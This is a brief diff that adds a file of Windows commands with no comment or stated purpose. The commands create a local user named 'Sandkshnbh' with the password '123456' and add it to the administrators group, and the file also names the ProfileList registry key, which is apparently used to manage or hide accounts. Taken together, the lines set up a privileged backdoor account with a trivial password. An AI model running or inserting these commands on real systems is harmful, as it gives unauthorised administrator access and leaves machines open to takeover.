@@ -1,0 +1,9 @@
+net user "Sandkshnbh" 123456 /add
+
+
+net localgroup administrators "Sandkshnbh" /add
+
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList
+
+
